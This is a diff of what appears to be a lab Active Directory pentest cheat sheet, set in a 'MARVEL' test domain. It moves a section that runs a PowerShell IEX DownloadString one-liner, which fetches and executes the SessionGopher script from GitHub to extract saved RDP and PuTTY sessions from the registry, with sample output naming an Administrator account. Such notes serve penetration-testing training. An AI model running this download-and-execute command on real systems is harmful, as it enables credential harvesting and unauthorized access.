@@ -883,26 +883,7 @@ PS C:\Windows\system32>
 
 ```
 
-Extract RDP, Putty sessions form Registry:
 
-```
-PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1'); Invoke-SessionGopher                                         
-          o_
-         /  ".   SessionGopher
-       ,"  _-"
-     ,"   m m
-  ..+     )      Brandon Arvanaghi
-     `m..m       Twitter: @arvanaghi | arvanaghi.com
-
-[+] Digging on Spiderman ...
-Microsoft Remote Desktop (RDP) Sessions
-
-
-Source   : Spiderman\pparker
-Hostname : 192.168.22.211
-Username : MARVEL\Administrator
-
-```
 # Active Directory Enumeration with WMIC
 
 Current Domain Name
@@ -1278,4 +1259,25 @@ ServicePrincipalName : {http/hydra.marvel.local:80}
 SID                  : S-1-5-21-1806573636-3987246654-2051155295-1109
 Surname              :
 UserPrincipalName    :
+```
+
+Extract RDP, Putty sessions form Registry:
+
+```
+PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1'); Invoke-SessionGopher                                         
+          o_
+         /  ".   SessionGopher
+       ,"  _-"
+     ,"   m m
+  ..+     )      Brandon Arvanaghi
+     `m..m       Twitter: @arvanaghi | arvanaghi.com
+
+[+] Digging on Spiderman ...
+Microsoft Remote Desktop (RDP) Sessions
+
+
+Source   : Spiderman\pparker
+Hostname : 192.168.22.211
+Username : MARVEL\Administrator
+
 ```
